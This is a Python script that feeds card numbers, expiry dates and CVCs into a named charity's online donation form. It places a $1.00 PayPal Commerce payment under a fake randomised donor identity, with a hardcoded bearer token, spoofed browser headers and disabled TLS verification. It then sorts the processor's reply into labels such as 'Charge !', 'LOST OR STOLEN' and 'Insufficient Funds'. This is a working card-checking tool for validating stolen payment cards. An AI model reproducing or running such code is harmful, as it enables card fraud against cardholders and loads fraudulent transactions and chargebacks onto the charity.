import base64, random, string, user_agent, time, cloudscraper, urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from faker import Faker
from requests_toolbelt.multipart.encoder import MultipartEncoder
from colorama import Fore, Back, Style, init
init(autoreset=True)
import re
import time
import subprocess
from user_agent import *
user = generate_user_agent()
from requests_toolbelt.multipart.encoder import MultipartEncoder, requests
r = requests.Session()
r.verify = False

def ahmed(ccx):
    ccx = ccx.strip()
    n = ccx.split("|")[0]
    mm = ccx.split("|")[1]
    yy = ccx.split("|")[2]
    cvc = ccx.split("|")[3].strip()
    if "20" in yy:
        yy = yy.split("20")[1]
    
    amount = "1.00"
    first_names = ["James", "John", "Robert", "Michael", "William", "David", "Richard", "Joseph", "Thomas", "Charles"]
    last_names = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", "Rodriguez", "Martinez"]
    cities = ["New York", "Los Angeles", "Chicago", "Houston", "Phoenix", "Philadelphia", "San Antonio", "San Diego", "Dallas", "San Jose"]
    states = ["AL", "AK", "AZ", "AR", "CA", "CO", "CT", "DE", "FL", "GA", "HI", "ID", "IL", "IN", "IA", "KS", "KY", "LA", "ME", "MD", "MA", "MI", "MN", "MS", "MO", "MT", "NE", "NV", "NH", "NJ", "NM", "NY", "NC", "ND", "OH", "OK", "OR", "PA", "RI", "SC", "SD", "TN", "TX", "UT", "VT", "VA", "WA", "WV", "WI", "WY"]
    street_names = ["Main", "Oak", "Pine", "Maple", "Cedar", "Elm", "Washington", "Lake", "Hill", "Park"]
    
    first_name = random.choice(first_names)
    last_name = random.choice(last_names)
    email = f"{first_name.lower()}{last_name.lower()}{random.randint(100, 999)}@gmail.com"
    phone = f"{random.randint(200, 999)}{random.randint(200, 999)}{random.randint(1000, 9999)}"
    company = f"{random.choice(['Global', 'National', 'Advanced', 'Premium'])} {random.choice(['Tech', 'Solutions', 'Services', 'Group'])}"
    street_number = random.randint(100, 9999)
    street_name = random.choice(street_names)
    street_type = random.choice(["St", "Ave", "Blvd", "Rd", "Ln"])
    street_address1 = f"{street_number} {street_name} {street_type}"
    street_address2 = f"{random.choice(['Apt', 'Unit', 'Suite'])} {random.randint(1, 999)}"
    city = random.choice(cities)
    state_abbr = random.choice(states)
    zip_code = f"{random.randint(10000, 99999)}"
    country = "United States"
    
    scraper = cloudscraper.create_scraper()
    headers = {
        'user-agent': user,
    }
    response = r.get(f'https://princessforaday.org/donations/custom-donation/', cookies=r.cookies, headers=headers)
    id_form1 = "2244-1"
    id_form2 = "2244"
    nonec = "2025615d00"
    au = "A21AANf6TAno7lxl1BhsXBPppnXsiLPPhwNmjnmAScJk33zReCZn6M-0SB8DQHqNW8Zq6tbERHjna7cUC3RA84rgbWKO7H15A"
    
    headers = {
        'origin': f'https://princessforaday.org',
        'referer': f'https://princessforaday.org/donations/custom-donation/',
        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }
    
    data = {
        'give-honeypot': '',
        'give-form-id-prefix': id_form1,
        'give-form-id': id_form2,
        'give-form-title': '',
        'give-current-url': f'https://princessforaday.org/donations/custom-donation/',
        'give-form-url': f'https://princessforaday.org/donations/custom-donation/',
        'give-form-minimum': amount,
        'give-form-maximum': '999999.99',
        'give-form-hash': nonec,
        'give-price-id': 'custom',
        'give-amount': amount,
        'give_stripe_payment_method': '',
        'payment-mode': 'paypal-commerce',
        'give_first': first_name,
        'give_last': last_name,
        'give_email': email,
        'card_name': f"{first_name} {last_name}",
        'card_exp_month': '',
        'card_exp_year': '',
        'give_action': 'purchase',
        'give-gateway': 'paypal-commerce',
        'action': 'give_process_donation',
        'give_ajax': 'true',
    }
    
    response = r.post(f'https://princessforaday.org/wp-admin/admin-ajax.php', cookies=r.cookies, headers=headers, data=data)
    data = MultipartEncoder({
        'give-honeypot': (None, ''),
        'give-form-id-prefix': (None, id_form1),
        'give-form-id': (None, id_form2),
        'give-form-title': (None, ''),
        'give-current-url': (None, f'https://princessforaday.org/donations/custom-donation/'),
        'give-form-url': (None, f'https://princessforaday.org/donations/custom-donation/'),
        'give-form-minimum': (None, amount),
        'give-form-maximum': (None, '999999.99'),
        'give-form-hash': (None, nonec),
        'give-price-id': (None, 'custom'),
        'give-recurring-logged-in-only': (None, ''),
        'give-logged-in-only': (None, '1'),
        '_give_is_donation_recurring': (None, '0'),
        'give_recurring_donation_details': (None, '{"give_recurring_option":"yes_donor"}'),
        'give-amount': (None, amount),
        'give_stripe_payment_method': (None, ''),
        'payment-mode': (None, 'paypal-commerce'),
        'give_first': (None, first_name),
        'give_last': (None, last_name),
        'give_email': (None, email),
        'card_name': (None, f"{first_name} {last_name}"),
        'card_exp_month': (None, ''),
        'card_exp_year': (None, ''),
        'give-gateway': (None, 'paypal-commerce'),
    })
    
    headers = {
        'content-type': data.content_type,
        'origin': f'https://princessforaday.org',
        'referer': f'https://princessforaday.org/donations/custom-donation/',
        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
    }
    
    params = {
        'action': 'give_paypal_commerce_create_order',
    }
    
    response = r.post(
        f'https://princessforaday.org/wp-admin/admin-ajax.php',
        params=params,
        cookies=r.cookies,
        headers=headers,
        data=data
    )
    tok = (response.json()['data']['id'])
    
    headers = {
        'authority': 'cors.api.paypal.com',
        'accept': '*/*',
        'accept-language': 'ar-EG,ar;q=0.9,en-EG;q=0.8,en-US;q=0.7,en;q=0.6',
        'authorization': f'Bearer {au}',
        'braintree-sdk-version': '3.32.0-payments-sdk-dev',
        'content-type': 'application/json',
        'origin': 'https://assets.braintreegateway.com',
        'paypal-client-metadata-id': '7d9928a1f3f1fbc240cfd71a3eefe835',
        'referer': 'https://assets.braintreegateway.com/',
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': user,
    }
    
    json_data = {
        'payment_source': {
            'card': {
                'number': n,
                'expiry': f'20{yy}-{mm}',
                'security_code': cvc,
                'attributes': {
                    'verification': {
                        'method': 'SCA_WHEN_REQUIRED',
                    },
                },
            },
        },
        'application_context': {
            'vault': False,
        },
    }
    
    response = r.post(
        f'https://cors.api.paypal.com/v2/checkout/orders/{tok}/confirm-payment-source',
        headers=headers,
        json=json_data,
    )
    
    data = MultipartEncoder({
        'give-honeypot': (None, ''),
        'give-form-id-prefix': (None, id_form1),
        'give-form-id': (None, id_form2),
        'give-form-title': (None, ''),
        'give-current-url': (None, f'https://princessforaday.org/donations/custom-donation/'),
        'give-form-url': (None, f'https://princessforaday.org/donations/custom-donation/'),
        'give-form-minimum': (None, amount),
        'give-form-maximum': (None, '999999.99'),
        'give-form-hash': (None, nonec),
        'give-price-id': (None, 'custom'),
        'give-recurring-logged-in-only': (None, ''),
        'give-logged-in-only': (None, '1'),
        '_give_is_donation_recurring': (None, '0'),
        'give_recurring_donation_details': (None, '{"give_recurring_option":"yes_donor"}'),
        'give-amount': (None, amount),
        'give_stripe_payment_method': (None, ''),
        'payment-mode': (None, 'paypal-commerce'),
        'give_first': (None, first_name),
        'give_last': (None, last_name),
        'give_email': (None, email),
        'card_name': (None, f"{first_name} {last_name}"),
        'card_exp_month': (None, ''),
        'card_exp_year': (None, ''),
        'give-gateway': (None, 'paypal-commerce'),
    })
    headers = {
        'content-type': data.content_type,
        'origin': f'https://princessforaday.org',
        'referer': f'https://princessforaday.org/donations/custom-donation/',
        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
    }
    
    params = {
        'action': 'give_paypal_commerce_approve_order',
        'order': tok,
    }
    
    response = r.post(
        f'https://princessforaday.org/wp-admin/admin-ajax.php',
        params=params,
        cookies=r.cookies,
        headers=headers,
        data=data
    )
    text = response.text
    if 'true' in text or 'sucsess' in text:
        return "Charge !"
    elif 'DO_NOT_HONOR' in text:
        return "Do not honor"
    elif 'ACCOUNT_CLOSED' in text:
        return "Account closed"
    elif 'PAYER_ACCOUNT_LOCKED_OR_CLOSED' in text:
        return "Account closed"
    elif 'LOST_OR_STOLEN' in text:
        return "LOST OR STOLEN"
    elif 'CVV2_FAILURE' in text:
        return "Card Issuer Declined CVV"
    elif 'SUSPECTED_FRAUD' in text:
        return "SUSPECTED FRAUD"
    elif 'INVALID_ACCOUNT' in text:
        return 'INVALID_ACCOUNT'
    elif 'REATTEMPT_NOT_PERMITTED' in text:
        return "REATTEMPT NOT PERMITTED"
    elif 'ACCOUNT BLOCKED BY ISSUER' in text:
        return "ACCOUNT_BLOCKED_BY_ISSUER"
    elif 'ORDER_NOT_APPROVED' in text:
        return 'ORDER_NOT_APPROVED'
    elif 'PICKUP_CARD_SPECIAL_CONDITIONS' in text:
        return 'PICKUP_CARD_SPECIAL_CONDITIONS'
    elif 'PAYER_CANNOT_PAY' in text:
        return "PAYER CANNOT PAY"
    elif 'INSUFFICIENT_FUNDS' in text:
        return 'Insufficient Funds'
    elif 'GENERIC_DECLINE' in text:
        return 'GENERIC_DECLINE'
    elif 'COMPLIANCE_VIOLATION' in text:
        return "COMPLIANCE VIOLATION"
    elif 'TRANSACTION_NOT PERMITTED' in text:
        return "TRANSACTION NOT PERMITTED"
    elif 'PAYMENT_DENIED' in text:
        return 'PAYMENT_DENIED'
    elif 'INVALID_TRANSACTION' in text:
        return "INVALID TRANSACTION"
    elif 'RESTRICTED_OR_INACTIVE_ACCOUNT' in text:
        return "RESTRICTED OR INACTIVE ACCOUNT"
    elif 'SECURITY_VIOLATION' in text:
        return 'SECURITY_VIOLATION'
    elif 'DECLINED_DUE_TO_UPDATED_ACCOUNT' in text:
        return "DECLINED DUE TO UPDATED ACCOUNT"
    elif 'INVALID_OR_RESTRICTED_CARD' in text:
        return "INVALID CARD"
    elif 'EXPIRED_CARD' in text:
        return "EXPIRED CARD"
    elif 'CRYPTOGRAPHIC_FAILURE' in text:
        return "CRYPTOGRAPHIC FAILURE"
    elif 'TRANSACTION_CANNOT_BE_COMPLETED' in text:
        return "TRANSACTION CANNOT BE COMPLETED"
    elif 'DECLINED_PLEASE_RETRY' in text:
        return "DECLINED PLEASE RETRY LATER"
    elif 'TX_ATTEMPTS_EXCEED_LIMIT' in text:
        return "EXCEED LIMIT"
    else:
        try:
            result = response.json()['data']['error']
            return result
        except:
            return "UNKNOWN_ERROR"